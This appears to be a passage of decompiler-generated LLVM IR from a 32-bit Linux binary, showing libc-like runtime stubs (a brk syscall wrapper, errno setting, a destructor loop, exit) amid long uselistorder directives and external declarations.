  uselistorder i8 0, { 46, 47, 85, 86, 68, 33, 43, 69, 6, 87, 88, 89, 90, 58, 91, 92, 93, 94, 95, 96, 34, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 2, 112, 113, 114, 115, 48, 52, 53, 49, 54, 50, 51, 55, 0, 56, 57, 60, 62, 59, 7, 61, 8, 63, 64, 65, 66, 67, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 70, 25, 26, 71, 27, 28, 29, 30, 31, 32, 72, 73, 74, 75, 76, 5, 77, 78, 9, 79, 80, 81, 82, 83, 84, 35, 36, 116, 117, 3, 119, 120, 118, 121, 122, 123, 124, 4, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 44, 145, 1, 146, 37, 45, 38, 39, 40, 41, 42 }
  uselistorder i32 2, { 57, 58, 59, 1, 90, 21, 91, 29, 54, 0, 30, 49, 31, 50, 32, 51, 15, 2, 86, 20, 3, 4, 5, 80, 6, 7, 8, 22, 23, 92, 9, 10, 27, 11, 33, 24, 28, 36, 34, 35, 17, 16, 25, 37, 26, 38, 62, 63, 76, 77, 65, 60, 64, 66, 67, 68, 69, 70, 71, 72, 73, 61, 74, 75, 13, 55, 40, 39, 81, 82, 83, 84, 85, 41, 44, 42, 45, 19, 43, 12, 46, 52, 47, 53, 48, 87, 88, 89, 14, 18, 78, 79, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 56 }
  uselistorder i8* null, { 34, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8054a17, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054a15, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_80549c7, { 1, 0 }
  uselistorder label %dec_label_pc_80549a3, { 1, 0 }
}

define i32 @function_8054a1d() local_unnamed_addr {
dec_label_pc_8054a1d:
  %v0_8054a1d = load i32, i32* @eax, align 4
  %v1_8054a1d = add i32 %v0_8054a1d, 28
  %v2_8054a1d = inttoptr i32 %v1_8054a1d to i32*
  %v3_8054a1d = load i32, i32* %v2_8054a1d, align 4
  store i32 %v3_8054a1d, i32* @global_var_8056f18.248, align 8
  %v1_8054a26 = add i32 %v0_8054a1d, 44
  %v2_8054a26 = inttoptr i32 %v1_8054a26 to i32*
  %v3_8054a26 = load i32, i32* %v2_8054a26, align 4
  store i32 %v3_8054a26, i32* @global_var_8056f1c.249, align 4
  ret i32 %v3_8054a26

; uselistorder directives
  uselistorder i32 44, { 7, 5, 4, 11, 13, 12, 8, 9, 10, 0, 2, 6, 14, 15, 16, 17, 1, 3 }
  uselistorder i32 28, { 29, 26, 27, 15, 24, 25, 30, 5, 6, 12, 7, 10, 11, 8, 16, 9, 17, 18, 19, 20, 21, 23, 22, 0, 28, 1, 13, 31, 4, 14, 3, 2, 32, 33, 34 }
}

define i32 @function_8054a2f(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054a2f:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054a2f = load i32, i32* @ebx, align 4
  store i32 %v0_8054a2f, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8054a42 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8054a42, i32* @global_var_8056938.247, align 8
  %v7_8054a4d = icmp ult i32 %v1_8054a42, %arg1
  %v1_8054a4f = icmp eq i1 %v7_8054a4d, false
  br i1 %v1_8054a4f, label %dec_label_pc_8054a5f, label %dec_label_pc_8054a51

dec_label_pc_8054a51:                             ; preds = %dec_label_pc_8054a2f
  %v1_8054a51 = call i32 @function_8052719(i32 %v0_8054a2f)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8054a59 = inttoptr i32 %v1_8054a51 to i32*
  store i32 12, i32* %v1_8054a59, align 4
  %v0_8054a5f.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054a63.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054a5f

dec_label_pc_8054a5f:                             ; preds = %dec_label_pc_8054a2f, %dec_label_pc_8054a51
  %v2_8054a63 = phi i32 [ %v0_8054a2f, %dec_label_pc_8054a2f ], [ %v2_8054a63.pre, %dec_label_pc_8054a51 ]
  %v0_8054a5f = phi i32 [ 0, %dec_label_pc_8054a2f ], [ %v0_8054a5f.pre, %dec_label_pc_8054a51 ]
  store i32 %v2_8054a63, i32* @ebx, align 4
  ret i32 %v0_8054a5f

; uselistorder directives
  uselistorder i32 %v1_8054a42, { 1, 0 }
  uselistorder i32 12, { 124, 110, 111, 112, 113, 114, 78, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 104, 105, 106, 107, 108, 109, 140, 158, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 71, 157, 72, 115, 116, 117, 118, 119, 67, 74, 68, 75, 69, 76, 70, 77, 81, 82, 91, 92, 93, 94, 83, 95, 86, 79, 85, 87, 88, 89, 96, 80, 84, 28, 90, 97, 103, 66, 98, 100, 101, 29, 99, 30, 31, 32, 33, 120, 0, 121, 122, 123, 34, 35, 36, 37, 38, 39, 102, 1, 2, 26, 10, 9, 8, 16, 64, 21, 43, 44, 42, 17, 49, 41, 47, 48, 18, 159, 7, 45, 46, 4, 6, 40, 160, 65, 161, 165, 162, 163, 164, 50, 51, 52, 53, 19, 20, 54, 55, 56, 166, 57, 58, 59, 60, 61, 62, 63, 5, 22, 23, 11, 12, 13, 14, 15, 167, 24, 3, 25, 168, 169, 27, 73 }
  uselistorder i32* @global_var_8056938.247, { 1, 0, 2 }
  uselistorder i32 45, { 1, 3, 0, 4, 2 }
  uselistorder label %dec_label_pc_8054a5f, { 1, 0 }
}

define i32 @function_8054a65() local_unnamed_addr {
dec_label_pc_8054a65:
  %v0_8054a68 = load i32, i32* @eax, align 4
  %v1_8054a6a = sub i32 0, %v0_8054a68
  %v1_8054a6c = call i32 @function_8052719(i32 ptrtoint (i32* @0 to i32))
  %v2_8054a71 = inttoptr i32 %v1_8054a6c to i32*
  store i32 %v1_8054a6a, i32* %v2_8054a71, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 (i32)* @function_8052719, { 37, 36, 53, 35, 34, 45, 1, 33, 56, 32, 31, 30, 0, 43, 42, 57, 29, 28, 27, 25, 24, 23, 41, 40, 44, 4, 18, 5, 55, 54, 39, 38, 17, 52, 16, 11, 20, 19, 51, 10, 15, 14, 50, 26, 22, 49, 13, 21, 12, 9, 48, 8, 7, 47, 46, 2, 6, 3 }
  uselistorder i32* @0, { 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 1, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 7, 8, 9, 18, 13, 16, 17, 14, 10, 11, 12, 15, 32, 33, 34, 35, 36, 37, 19, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 97, 96, 201, 95, 129, 130, 181, 182, 183, 131, 132, 128, 149, 148, 144, 145, 146, 147, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 98, 184, 185, 186, 187, 188, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 202, 203, 204, 205, 206, 207 }
}

define i32 @function_8054a80() local_unnamed_addr {
dec_label_pc_8054a80:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_8054a8c = load i32, i32* @global_var_80567c4.234, align 4
  %v10_8054a91 = icmp eq i32 %v0_8054a8c, -1
  br i1 %v10_8054a91, label %dec_label_pc_8054aa2, label %dec_label_pc_8054a96.preheader

dec_label_pc_8054a96.preheader:                   ; preds = %dec_label_pc_8054a80
  br label %dec_label_pc_8054a96

dec_label_pc_8054a96:                             ; preds = %dec_label_pc_8054a96.preheader, %dec_label_pc_8054a96
  %v4_8054a99 = phi i32 [ %v0_8054a8c, %dec_label_pc_8054a96.preheader ], [ %v2_8054a9b, %dec_label_pc_8054a96 ]
  %v0_8054a96 = phi i32 [ ptrtoint (i32* @global_var_80567c4.234 to i32), %dec_label_pc_8054a96.preheader ], [ %v1_8054a96, %dec_label_pc_8054a96 ]
  %v1_8054a96 = add i32 %v0_8054a96, -4
  call void @__pseudo_call(i32 %v4_8054a99)
  %v1_8054a9b = inttoptr i32 %v1_8054a96 to i32*
  %v2_8054a9b = load i32, i32* %v1_8054a9b, align 4
  %v10_8054a9d = icmp eq i32 %v2_8054a9b, -1
  %v1_8054aa0 = icmp eq i1 %v10_8054a9d, false
  br i1 %v1_8054aa0, label %dec_label_pc_8054a96, label %dec_label_pc_8054aa2.loopexit

dec_label_pc_8054aa2.loopexit:                    ; preds = %dec_label_pc_8054a96
  %v2_8054aa2.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8054aa2

dec_label_pc_8054aa2:                             ; preds = %dec_label_pc_8054aa2.loopexit, %dec_label_pc_8054a80
  %v2_8054aa2 = phi i32 [ %v2_8054aa2.pre, %dec_label_pc_8054aa2.loopexit ], [ %tmp6, %dec_label_pc_8054a80 ]
  ret i32 %v2_8054aa2

; uselistorder directives
  uselistorder i32 %v0_8054a8c, { 1, 0 }
  uselistorder i1 false, { 125, 126, 28, 29, 31, 30, 127, 128, 129, 97, 98, 130, 133, 134, 135, 136, 137, 139, 11, 140, 141, 138, 132, 131, 25, 142, 143, 144, 1, 146, 147, 0, 148, 99, 100, 101, 102, 103, 104, 12, 149, 150, 151, 3, 152, 153, 154, 155, 2, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 156, 79, 80, 81, 82, 83, 84, 85, 86, 87, 169, 170, 171, 172, 173, 174, 175, 176, 177, 10, 179, 178, 183, 180, 181, 182, 13, 184, 185, 145, 26, 4, 27, 186, 187, 15, 105, 106, 107, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 16, 198, 108, 109, 110, 199, 200, 201, 5, 32, 6, 202, 203, 204, 35, 45, 50, 51, 36, 53, 46, 47, 48, 52, 33, 34, 37, 38, 39, 40, 41, 42, 43, 44, 49, 54, 55, 78, 76, 18, 77, 19, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 75, 70, 73, 88, 89, 90, 91, 92, 93, 94, 20, 95, 96, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 71, 72, 74, 205, 206, 207, 208, 209, 7, 211, 212, 213, 210, 214, 215, 216, 217, 218, 219, 8, 220, 221, 222, 223, 17, 224, 225, 226, 227, 228, 229, 230, 22, 21, 231, 23, 232, 233, 234, 235, 9, 24, 14, 236 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 6, 2, 0 }
  uselistorder i32 -4, { 15, 16, 17, 18, 102, 103, 104, 105, 11, 106, 3, 101, 19, 97, 12, 98, 99, 100, 13, 0, 9, 10, 107, 108, 109, 110, 111, 112, 113, 14, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 7, 57, 8, 58, 59, 60, 2, 6, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 4, 5, 89, 90, 91, 92, 93, 94, 95, 1, 96 }
  uselistorder i32 ptrtoint (i32* @global_var_80567c4.234 to i32), { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 -1, { 27, 28, 0, 121, 204, 76, 122, 77, 78, 123, 79, 124, 80, 125, 81, 126, 82, 127, 83, 128, 84, 129, 85, 130, 86, 131, 25, 26, 13, 12, 87, 88, 132, 89, 133, 90, 134, 29, 1, 135, 75, 91, 92, 136, 137, 138, 15, 139, 14, 140, 94, 93, 141, 205, 17, 18, 142, 16, 143, 30, 206, 31, 144, 207, 34, 33, 35, 36, 22, 37, 95, 38, 145, 32, 208, 11, 146, 147, 117, 148, 19, 39, 2, 96, 209, 210, 97, 202, 40, 98, 149, 99, 150, 100, 151, 73, 74, 152, 101, 153, 102, 154, 103, 155, 104, 156, 105, 157, 106, 158, 107, 159, 108, 160, 109, 161, 110, 162, 111, 163, 112, 164, 113, 165, 114, 166, 115, 167, 41, 168, 169, 3, 170, 20, 4, 171, 42, 172, 116, 211, 118, 43, 173, 174, 198, 199, 175, 194, 200, 44, 176, 177, 178, 179, 195, 48, 180, 181, 182, 183, 184, 185, 47, 186, 196, 45, 46, 187, 197, 188, 189, 49, 190, 201, 5, 50, 51, 52, 53, 54, 191, 192, 23, 6, 55, 193, 21, 10, 9, 8, 7, 56, 203, 57, 58, 59, 60, 61, 24, 62, 212, 213, 214, 63, 215, 216, 69, 64, 217, 65, 66, 67, 68, 218, 70, 219, 71, 72, 220, 221, 119, 120 }
  uselistorder i32 1, { 275, 276, 73, 159, 160, 415, 416, 417, 418, 161, 515, 277, 5, 4, 6, 278, 57, 56, 55, 279, 12, 280, 282, 281, 32, 284, 283, 33, 286, 285, 34, 287, 97, 288, 113, 289, 93, 290, 119, 291, 124, 292, 114, 293, 294, 36, 35, 37, 184, 71, 296, 295, 298, 297, 94, 299, 3, 301, 300, 77, 302, 306, 305, 304, 303, 50, 516, 517, 518, 309, 308, 307, 54, 53, 162, 310, 312, 311, 115, 163, 259, 413, 146, 318, 317, 316, 315, 314, 313, 75, 76, 185, 319, 479, 480, 481, 257, 482, 320, 86, 88, 89, 85, 87, 164, 260, 323, 322, 321, 98, 186, 520, 521, 522, 324, 66, 523, 524, 165, 525, 526, 527, 92, 90, 91, 261, 519, 187, 104, 105, 106, 107, 188, 166, 453, 454, 455, 456, 327, 326, 325, 121, 120, 122, 189, 328, 83, 84, 191, 528, 529, 530, 531, 532, 533, 534, 535, 536, 190, 537, 538, 539, 540, 541, 167, 542, 543, 125, 168, 544, 545, 546, 547, 169, 170, 548, 549, 550, 330, 329, 79, 78, 80, 82, 81, 171, 172, 331, 173, 174, 192, 335, 334, 333, 332, 63, 193, 262, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 194, 195, 352, 351, 353, 175, 356, 355, 354, 61, 196, 357, 358, 47, 359, 110, 361, 360, 49, 362, 48, 363, 117, 364, 112, 366, 365, 44, 367, 45, 368, 62, 46, 370, 369, 74, 371, 70, 373, 372, 118, 375, 374, 108, 376, 116, 378, 377, 96, 379, 58, 380, 72, 95, 551, 552, 553, 554, 258, 381, 42, 38, 41, 39, 40, 43, 555, 556, 126, 127, 557, 558, 0, 559, 560, 561, 562, 563, 197, 564, 198, 565, 383, 382, 111, 483, 176, 65, 64, 566, 177, 240, 567, 568, 178, 569, 570, 199, 571, 131, 59, 60, 419, 132, 384, 68, 69, 67, 572, 573, 574, 385, 24, 25, 23, 26, 575, 576, 268, 27, 29, 28, 31, 30, 577, 269, 20, 21, 22, 422, 423, 424, 425, 426, 427, 428, 436, 437, 438, 200, 439, 429, 206, 440, 212, 432, 214, 420, 208, 431, 204, 433, 202, 434, 441, 215, 210, 421, 211, 216, 217, 430, 209, 213, 205, 203, 201, 435, 442, 218, 207, 452, 450, 451, 443, 444, 445, 446, 448, 219, 449, 100, 102, 101, 99, 103, 447, 263, 386, 123, 457, 458, 459, 460, 245, 244, 139, 128, 461, 462, 179, 137, 138, 129, 463, 464, 180, 136, 246, 248, 465, 466, 264, 467, 468, 469, 241, 242, 470, 471, 243, 249, 247, 472, 473, 474, 220, 475, 476, 477, 183, 478, 389, 388, 387, 8, 9, 10, 7, 11, 390, 270, 391, 221, 181, 265, 392, 394, 393, 147, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 222, 494, 495, 496, 497, 158, 223, 266, 224, 267, 514, 225, 399, 398, 397, 396, 395, 109, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 404, 403, 271, 274, 402, 401, 272, 400, 51, 52, 1, 250, 2, 148, 149, 578, 579, 580, 581, 582, 133, 134, 583, 584, 585, 586, 587, 229, 140, 141, 228, 142, 232, 143, 588, 589, 230, 144, 145, 231, 590, 135, 130, 591, 592, 593, 594, 595, 251, 150, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 236, 157, 156, 606, 252, 151, 607, 608, 609, 610, 611, 233, 612, 613, 234, 614, 253, 152, 615, 254, 153, 616, 617, 255, 154, 618, 619, 256, 155, 620, 621, 622, 623, 624, 235, 625, 627, 628, 626, 237, 629, 630, 631, 632, 226, 227, 633, 634, 635, 636, 238, 414, 239, 637, 182, 411, 410, 409, 408, 407, 406, 405, 273, 19, 16, 15, 13, 14, 17, 18, 412 }
  uselistorder label %dec_label_pc_8054a96, { 1, 0 }
}

define i32 @function_8054aa6() local_unnamed_addr {
entry:
  %v0_8054aa9 = load i32, i32* @ebx, align 4
  %v1_8054aaa = call i32 @function_80480b0(i32 %v0_8054aa9)
  store i32 %v1_8054aaa, i32* @eax, align 4
  %v0_8054ab5 = call i32 @function_80480c0()
  ret i32 %v0_8054ab5

; uselistorder directives
  uselistorder i32* @eax, { 9, 50, 51, 53, 54, 55, 56, 58, 16, 59, 1, 57, 6, 8, 52, 60, 62, 63, 61, 34, 35, 64, 70, 65, 66, 68, 69, 67, 37, 38, 17, 2, 3, 10, 24, 26, 25, 27, 31, 32, 33, 28, 29, 30, 36, 5, 18, 39, 11, 40, 41, 42, 12, 43, 0, 13, 14, 44, 45, 46, 47, 15, 71, 19, 20, 21, 72, 73, 74, 75, 76, 22, 23, 77, 48, 49, 4, 7 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 686, 70, 396, 71, 475, 476, 72, 477, 478, 479, 73, 145, 146, 586, 587, 74, 481, 687, 688, 689, 202, 690, 691, 692, 565, 588, 589, 693, 466, 465, 694, 695, 696, 467, 590, 591, 592, 593, 463, 697, 698, 699, 75, 700, 147, 705, 706, 10, 76, 397, 11, 398, 399, 708, 709, 139, 710, 77, 378, 78, 203, 204, 0, 701, 702, 703, 79, 464, 389, 80, 400, 711, 1, 148, 149, 81, 712, 713, 82, 83, 715, 714, 26, 27, 716, 719, 205, 379, 720, 722, 721, 24, 25, 723, 704, 594, 595, 596, 597, 401, 402, 53, 598, 201, 403, 150, 84, 724, 30, 380, 85, 151, 728, 731, 730, 28, 29, 734, 735, 736, 737, 738, 152, 739, 740, 741, 206, 732, 207, 733, 208, 404, 566, 64, 567, 153, 405, 568, 569, 742, 743, 744, 745, 746, 747, 748, 749, 750, 154, 155, 751, 406, 763, 407, 408, 209, 381, 409, 210, 382, 86, 410, 752, 753, 87, 88, 211, 383, 66, 754, 755, 756, 89, 90, 212, 384, 65, 757, 140, 758, 55, 759, 760, 762, 411, 761, 2, 729, 717, 718, 468, 469, 471, 470, 31, 32, 3, 156, 472, 473, 474, 480, 599, 600, 412, 413, 601, 602, 603, 604, 605, 606, 607, 608, 414, 482, 609, 764, 727, 483, 765, 610, 611, 484, 707, 67, 157, 725, 485, 612, 726, 613, 766, 486, 767, 768, 415, 769, 8, 91, 416, 770, 213, 771, 772, 158, 773, 12, 33, 56, 13, 57, 14, 774, 4, 34, 58, 15, 59, 16, 93, 92, 60, 17, 94, 95, 487, 68, 614, 615, 96, 417, 391, 775, 776, 777, 778, 779, 780, 99, 98, 97, 781, 167, 101, 100, 102, 418, 782, 137, 419, 488, 420, 421, 9, 103, 422, 61, 18, 104, 423, 105, 424, 425, 426, 491, 492, 493, 427, 159, 494, 496, 497, 498, 428, 510, 511, 512, 513, 514, 107, 108, 429, 515, 516, 499, 430, 431, 521, 522, 520, 508, 509, 489, 490, 517, 518, 519, 500, 501, 502, 503, 504, 505, 506, 507, 19, 142, 143, 138, 432, 106, 433, 523, 563, 564, 560, 561, 562, 141, 558, 559, 109, 434, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 392, 435, 536, 436, 110, 437, 538, 539, 540, 541, 542, 160, 161, 543, 544, 545, 438, 495, 553, 554, 555, 556, 546, 547, 548, 552, 557, 111, 162, 537, 112, 385, 439, 440, 393, 394, 570, 571, 47, 45, 441, 46, 44, 442, 572, 573, 574, 575, 576, 577, 578, 168, 443, 579, 580, 581, 582, 386, 444, 445, 583, 584, 69, 585, 163, 113, 176, 616, 114, 183, 184, 185, 174, 175, 35, 36, 617, 618, 619, 115, 51, 620, 621, 622, 623, 116, 50, 624, 625, 626, 627, 117, 49, 628, 629, 630, 631, 118, 48, 632, 633, 634, 177, 178, 179, 180, 181, 182, 635, 636, 172, 171, 637, 169, 7, 6, 170, 638, 173, 639, 186, 640, 187, 641, 188, 642, 189, 643, 645, 646, 647, 644, 648, 649, 190, 191, 650, 164, 651, 165, 119, 674, 20, 62, 387, 446, 447, 448, 652, 658, 192, 653, 654, 193, 655, 194, 656, 195, 657, 39, 659, 196, 197, 660, 198, 661, 662, 199, 663, 200, 664, 665, 666, 667, 449, 668, 669, 670, 671, 38, 214, 120, 121, 450, 451, 672, 673, 52, 63, 122, 452, 37, 215, 217, 218, 453, 123, 124, 216, 388, 125, 549, 550, 551, 21, 126, 395, 22, 219, 127, 128, 675, 676, 677, 678, 679, 680, 783, 784, 681, 682, 785, 786, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 787, 788, 789, 790, 791, 792, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 43, 848, 849, 850, 851, 852, 853, 854, 129, 454, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 455, 893, 885, 886, 887, 888, 889, 890, 891, 892, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 130, 456, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 220, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 969, 968, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 131, 457, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 132, 458, 1018, 1019, 390, 1020, 1021, 459, 1022, 1023, 1024, 133, 460, 1025, 54, 1026, 23, 40, 41, 42, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 166, 134, 135, 461, 5, 683, 684, 685, 136, 462, 144, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042 }
  uselistorder i32* @ebx, { 22, 372, 373, 231, 232, 27, 374, 2, 375, 376, 377, 378, 182, 183, 379, 24, 380, 381, 382, 383, 384, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 3, 252, 253, 254, 23, 385, 386, 387, 388, 389, 390, 391, 392, 393, 20, 21, 402, 403, 404, 405, 17, 4, 16, 396, 399, 400, 401, 394, 406, 407, 408, 409, 410, 411, 412, 413, 395, 255, 256, 422, 423, 424, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 5, 439, 440, 425, 426, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 6, 196, 197, 198, 199, 200, 201, 202, 441, 466, 467, 468, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 18, 452, 453, 454, 455, 456, 7, 457, 458, 459, 460, 461, 462, 463, 464, 465, 420, 421, 25, 26, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 28, 285, 286, 469, 470, 418, 419, 29, 471, 472, 287, 288, 289, 290, 30, 397, 398, 414, 415, 31, 291, 292, 416, 417, 293, 294, 473, 474, 32, 475, 476, 477, 33, 295, 296, 8, 297, 298, 34, 35, 478, 479, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 138, 139, 140, 156, 10, 157, 158, 159, 160, 145, 146, 161, 143, 136, 142, 144, 147, 148, 149, 137, 162, 141, 150, 151, 152, 153, 154, 155, 163, 164, 165, 166, 167, 168, 178, 179, 180, 9, 181, 169, 170, 171, 172, 173, 174, 175, 176, 177, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 11, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 301, 299, 300, 0, 302, 303, 304, 305, 306, 307, 12, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 19, 357, 358, 359, 360, 361, 362, 363, 480, 481, 482, 364, 365, 366, 367, 483, 484, 485, 486, 13, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 487, 488, 489, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 1, 519, 520, 521, 522, 523, 15, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 14, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 368, 369, 370, 371 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

